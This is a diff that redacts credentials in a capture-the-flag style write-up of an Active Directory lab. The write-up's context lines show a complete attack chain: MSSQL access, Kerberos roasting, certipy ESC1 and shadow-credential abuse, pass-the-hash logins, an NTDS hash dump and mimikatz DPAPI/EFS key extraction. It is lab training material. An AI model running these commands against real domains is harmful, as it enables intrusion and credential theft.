@@ -15,7 +15,6 @@ tags: ["windows", "active-directory", "deserialization", "json.net", "mssql", "a
 
 ## Overview
 
-**Platform:** Ludus (Private Lab)
 **Difficulty:** Hard
 **Domain:** goingmerry.local
 **IP:** `10.13.10.80`
@@ -46,41 +45,6 @@ The engagement identified critical vulnerabilities across multiple services:
 - **EFS-encrypted root flag** requiring DPAPI backup key extraction for final decryption
 
 **Risk Rating:** Critical
-
----
-
-## Attack Path Overview
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│    IIS Deserialization (TypeNameHandling.All) → RCE as svc_web  │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│    web.config → MSSQL creds (nami) → xp_cmdshell → User Flag   │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│    ADCS ESC1 (StrawHatAuth template) → Certificate as r.zoro   │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│    Shadow Credentials (GenericWrite) → s.vinsmoke NT hash       │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│    SeBackupPrivilege → DiskShadow → NTDS.dit → m.luffy DA hash │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│    DPAPI Backup Key → EFS Decryption → Root Flag               │
-└─────────────────────────────────────────────────────────────────┘
-```
 
 ---
 
@@ -343,7 +307,7 @@ type C:\inetpub\wwwroot\web.config
   <connectionStrings>
     <!-- Treasure Management Database - Navigator Division -->
     <add name="TreasureDB"
-         connectionString="Server=localhost;Database=master;User Id=nami;Password=B3li3M3r3T4ng3r1n3s;"
+         connectionString="Server=localhost;Database=master;User Id=nami;Password=[REDACTED];"
          providerName="System.Data.SqlClient" />
   </connectionStrings>
   <system.web>
@@ -357,12 +321,12 @@ type C:\inetpub\wwwroot\web.config
 </configuration>
 ```
 
-MSSQL credentials discovered: **nami** / **B3li3M3r3T4ng3r1n3s**
+MSSQL credentials discovered: **nami** / **[REDACTED]**
 
 ### Connecting to MSSQL
 
 ```bash
-impacket-mssqlclient 'GOINGMERRY.LOCAL/nami:B3li3M3r3T4ng3r1n3s@10.13.10.80'
+impacket-mssqlclient 'GOINGMERRY.LOCAL/nami:[REDACTED]@10.13.10.80'
 ```
 
 ```
@@ -447,7 +411,7 @@ GM{th3_n4v1g4t0r_ch4rt3d_th3_c0urs3}
 Using `bloodhound-python` to collect AD data from the attacker box:
 
 ```bash
-bloodhound-python -u 'nami' -p 'B3li3M3r3T4ng3r1n3s' -d goingmerry.local -ns 10.13.10.80 -c all
+bloodhound-python -u 'nami' -p '[REDACTED]' -d goingmerry.local -ns 10.13.10.80 -c all
 ```
 
 ```
@@ -486,7 +450,7 @@ impacket-GetNPUsers goingmerry.local/ -dc-ip 10.13.10.80 -usersfile users.txt -f
 ```
 
 ```
-$krb5asrep$23$t.chopper@GOINGMERRY.LOCAL:a1b2c3d4...
+$krb5asrep$23$t.chopper@GOINGMERRY.LOCAL:[HASH REDACTED]
 ```
 
 `t.chopper` is ASREPRoastable — but the password is 30+ random characters. Hashcat won't crack it with any wordlist.
@@ -494,7 +458,7 @@ $krb5asrep$23$t.chopper@GOINGMERRY.LOCAL:a1b2c3d4...
 **Kerberoastable account:**
 
 ```bash
-impacket-GetUserSPNs goingmerry.local/nami:'B3li3M3r3T4ng3r1n3s' -dc-ip 10.13.10.80
+impacket-GetUserSPNs goingmerry.local/nami:'[REDACTED]' -dc-ip 10.13.10.80
 ```
 
 ```
@@ -517,7 +481,7 @@ HTTP/goingmerry.local   usopp             2026-01-15 10:30:22.000000  <never>
 ### Enumerating Certificate Templates
 
 ```bash
-certipy find -u 'nami@goingmerry.local' -p 'B3li3M3r3T4ng3r1n3s' -dc-ip 10.13.10.80 -ldap-scheme ldap -vulnerable -stdout
+certipy find -u 'nami@goingmerry.local' -p '[REDACTED]' -dc-ip 10.13.10.80 -ldap-scheme ldap -vulnerable -stdout
 ```
 
 ```
@@ -588,7 +552,7 @@ The **StrawHatAuth** template is vulnerable to **ESC1**:
 ### Requesting Certificate as r.zoro
 
 ```bash
-certipy req -u 'nami@goingmerry.local' -p 'B3li3M3r3T4ng3r1n3s' \
+certipy req -u 'nami@goingmerry.local' -p '[REDACTED]' \
   -dc-ip 10.13.10.80 -ca GOINGMERRY-CA -template StrawHatAuth \
   -upn r.zoro@goingmerry.local -ldap-scheme ldap
 ```
@@ -618,10 +582,10 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got TGT
 [*] Saved credential cache to 'r.zoro.ccache'
 [*] Trying to retrieve NT hash for 'r.zoro'
-[*] Got hash for 'r.zoro@goingmerry.local': aad3b435b51404eeaad3b435b51404ee:7c3e8d5a2f4e1b9c6d8f0a3e5b7c9d1e
+[*] Got hash for 'r.zoro@goingmerry.local': aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]
 ```
 
-We now have `r.zoro`'s NT hash: **`7c3e8d5a2f4e1b9c6d8f0a3e5b7c9d1e`**
+We now have `r.zoro`'s NT hash: **`[HASH REDACTED]`**
 
 ---
 
@@ -632,13 +596,13 @@ We now have `r.zoro`'s NT hash: **`7c3e8d5a2f4e1b9c6d8f0a3e5b7c9d1e`**
 BloodHound showed that `r.zoro` has **GenericWrite** on `s.vinsmoke`. We can verify with nxc:
 
 ```bash
-nxc ldap 10.13.10.80 -u r.zoro -H '7c3e8d5a2f4e1b9c6d8f0a3e5b7c9d1e' \
+nxc ldap 10.13.10.80 -u r.zoro -H '[HASH REDACTED]' \
   -d goingmerry.local -M daclread -o TARGET=s.vinsmoke ACTION=read
 ```
 
 ```
 SMB  10.13.10.80  445  GOINGMERRY  [*] Windows Server 2022 Build 20348 x64 (name:GOINGMERRY) (domain:goingmerry.local) (signing:True) (SMBv1:False)
-LDAP 10.13.10.80  389  GOINGMERRY  [+] goingmerry.local\r.zoro:7c3e8d5a2f4e1b9c6d8f0a3e5b7c9d1e
+LDAP 10.13.10.80  389  GOINGMERRY  [+] goingmerry.local\r.zoro:[HASH REDACTED]
 LDAP 10.13.10.80  389  GOINGMERRY  [*] Found ACE for r.zoro on s.vinsmoke:
 LDAP 10.13.10.80  389  GOINGMERRY  [*]   ACE Type: ACCESS_ALLOWED_ACE
 LDAP 10.13.10.80  389  GOINGMERRY  [*]   Access Mask: GenericWrite
@@ -650,7 +614,7 @@ GenericWrite allows writing the `msDS-KeyCredentialLink` attribute on `s.vinsmok
 
 ```bash
 certipy shadow auto -u 'r.zoro@goingmerry.local' \
-  -hashes ':7c3e8d5a2f4e1b9c6d8f0a3e5b7c9d1e' \
+  -hashes ':[HASH REDACTED]' \
   -account s.vinsmoke -dc-ip 10.13.10.80 -ldap-scheme ldap
 ```
 
@@ -670,26 +634,26 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got TGT
 [*] Saved credential cache to 's.vinsmoke.ccache'
 [*] Trying to retrieve NT hash for 's.vinsmoke'
-[*] Got hash for 's.vinsmoke@goingmerry.local': aad3b435b51404eeaad3b435b51404ee:4a8b2c6d9e1f3a5b7c9d0e2f4a6b8c1d
+[*] Got hash for 's.vinsmoke@goingmerry.local': aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]
 ```
 
-We now have `s.vinsmoke`'s NT hash: **`4a8b2c6d9e1f3a5b7c9d0e2f4a6b8c1d`**
+We now have `s.vinsmoke`'s NT hash: **`[HASH REDACTED]`**
 
 ### Confirming Backup Operators Membership
 
 ```bash
-nxc smb 10.13.10.80 -u s.vinsmoke -H '4a8b2c6d9e1f3a5b7c9d0e2f4a6b8c1d' -d goingmerry.local
+nxc smb 10.13.10.80 -u s.vinsmoke -H '[HASH REDACTED]' -d goingmerry.local
 ```
 
 ```
 SMB  10.13.10.80  445  GOINGMERRY  [*] Windows Server 2022 Build 20348 x64 (name:GOINGMERRY) (domain:goingmerry.local) (signing:True) (SMBv1:False)
-SMB  10.13.10.80  445  GOINGMERRY  [+] goingmerry.local\s.vinsmoke:4a8b2c6d9e1f3a5b7c9d0e2f4a6b8c1d
+SMB  10.13.10.80  445  GOINGMERRY  [+] goingmerry.local\s.vinsmoke:[HASH REDACTED]
 ```
 
 Connecting via WinRM to check privileges:
 
 ```bash
-evil-winrm -i 10.13.10.80 -u s.vinsmoke -H '4a8b2c6d9e1f3a5b7c9d0e2f4a6b8c1d'
+evil-winrm -i 10.13.10.80 -u s.vinsmoke -H '[HASH REDACTED]'
 ```
 
 ```
@@ -807,30 +771,30 @@ impacket-secretsdump -ntds ntds.dit -system system.hive -security security.hive 
 ```
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
-[*] Target system bootKey: 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
+[*] Target system bootKey: [HASH REDACTED]
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Searching for pekList value using given bootkey
 [*] PEK # 0 found and decrypted
 [*] Reading and decrypting hashes from ntds.dit
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7:::
-m.luffy:1103:aad3b435b51404eeaad3b435b51404ee:e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0:::
-r.zoro:1104:aad3b435b51404eeaad3b435b51404ee:7c3e8d5a2f4e1b9c6d8f0a3e5b7c9d1e:::
-nami:1105:aad3b435b51404eeaad3b435b51404ee:a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8:::
-usopp:1106:aad3b435b51404eeaad3b435b51404ee:b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9:::
-s.vinsmoke:1107:aad3b435b51404eeaad3b435b51404ee:4a8b2c6d9e1f3a5b7c9d0e2f4a6b8c1d:::
-t.chopper:1108:aad3b435b51404eeaad3b435b51404ee:c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0:::
-n.robin:1109:aad3b435b51404eeaad3b435b51404ee:d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1:::
-c.flam:1110:aad3b435b51404eeaad3b435b51404ee:e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2:::
-brook:1111:aad3b435b51404eeaad3b435b51404ee:f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3:::
-jinbe:1112:aad3b435b51404eeaad3b435b51404ee:a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4:::
-svc_web:1113:aad3b435b51404eeaad3b435b51404ee:b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+m.luffy:1103:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+r.zoro:1104:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+nami:1105:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+usopp:1106:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+s.vinsmoke:1107:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+t.chopper:1108:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+n.robin:1109:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+c.flam:1110:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+brook:1111:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+jinbe:1112:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+svc_web:1113:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
 [*] Kerberos keys grabbed
 [*] Cleaning up...
 ```
 
-Domain Admin hash obtained: **m.luffy** : `e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0`
+Domain Admin hash obtained: **m.luffy** : `[HASH REDACTED]`
 
 ---
 
@@ -839,7 +803,7 @@ Domain Admin hash obtained: **m.luffy** : `e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0`
 ### Connecting as Domain Admin
 
 ```bash
-evil-winrm -i 10.13.10.80 -u m.luffy -H 'e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0'
+evil-winrm -i 10.13.10.80 -u m.luffy -H '[HASH REDACTED]'
 ```
 
 ```
@@ -961,10 +925,10 @@ mimikatz(commandline) # dpapi::masterkey /in:... /pvk:...
 
 [masterkey] with DPAPI_SYSTEM (machine, then user)
 ** MASTERKEY **
-    0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d
+    [HASH REDACTED]
 
-  key : 0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d
-  sha1: a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0
+  key : [HASH REDACTED]
+  sha1: [HASH REDACTED]
 
 mimikatz(commandline) # exit
 ```
@@ -988,7 +952,7 @@ Mode                 LastWriteTime         Length Name
 Decrypt the EFS private key using the decrypted master key:
 
 ```powershell
-*Evil-WinRM* PS C:\Users\m.luffy\Documents> C:\temp\mimikatz.exe "dpapi::capi /in:C:\Users\m.luffy\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2847392816-1295834720-3948571062-1103\f7e6d5c4b3a29180 /masterkey:0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d" "exit"
+*Evil-WinRM* PS C:\Users\m.luffy\Documents> C:\temp\mimikatz.exe "dpapi::capi /in:C:\Users\m.luffy\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2847392816-1295834720-3948571062-1103\f7e6d5c4b3a29180 /masterkey:[HASH REDACTED]" "exit"
 ```
 
 ```
@@ -1007,7 +971,7 @@ mimikatz(commandline) # exit
 With the EFS private key now exported, use mimikatz's `crypto::decrypt` or load the key into the user context to decrypt:
 
 ```powershell
-*Evil-WinRM* PS C:\Users\m.luffy\Documents> C:\temp\mimikatz.exe "privilege::debug" "crypto::certificates /systemstore:local_machine /export" "dpapi::capi /in:C:\Users\m.luffy\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2847392816-1295834720-3948571062-1103\f7e6d5c4b3a29180 /masterkey:0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d" "exit"
+*Evil-WinRM* PS C:\Users\m.luffy\Documents> C:\temp\mimikatz.exe "privilege::debug" "crypto::certificates /systemstore:local_machine /export" "dpapi::capi /in:C:\Users\m.luffy\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2847392816-1295834720-3948571062-1103\f7e6d5c4b3a29180 /masterkey:[HASH REDACTED]" "exit"
 ```
 
 Alternatively, using the decrypted PVK to build a PFX and decrypt with `cipher`:
@@ -1039,20 +1003,20 @@ svc_web         : [Deser RCE]              → IIS App Pool (no SeImpersonate)
 
 Stage 2 — Lateral Movement (nami)
 ────────────────────────────────────────────────────────────────
-nami            : B3li3M3r3T4ng3r1n3s      → MSSQL sysadmin (web.config)
+nami            : [REDACTED]               → MSSQL sysadmin (web.config)
 
 Stage 3 — ADCS ESC1 (r.zoro)
 ────────────────────────────────────────────────────────────────
-r.zoro          : [NTLM] 7c3e8d..1e       → Certificate impersonation via PKINIT
+r.zoro          : [NTLM] [HASH REDACTED]   → Certificate impersonation via PKINIT
 
 Stage 4 — Shadow Credentials (s.vinsmoke)
 ────────────────────────────────────────────────────────────────
-s.vinsmoke      : [NTLM] 4a8b2c..1d       → Backup Operators (GenericWrite → Shadow Creds)
+s.vinsmoke      : [NTLM] [HASH REDACTED]   → Backup Operators (GenericWrite → Shadow Creds)
 
 Stage 5 — NTDS Dump (m.luffy)
 ────────────────────────────────────────────────────────────────
-m.luffy         : [NTLM] e5d4c3..b0       → Domain Admin (SeBackupPrivilege → NTDS)
-Administrator   : [NTLM] 9a8b7c..4d       → Domain Admin (NTDS dump)
+m.luffy         : [NTLM] [HASH REDACTED]   → Domain Admin (SeBackupPrivilege → NTDS)
+Administrator   : [NTLM] [HASH REDACTED]   → Domain Admin (NTDS dump)
 
 Stage 6 — EFS Decrypt
 ────────────────────────────────────────────────────────────────
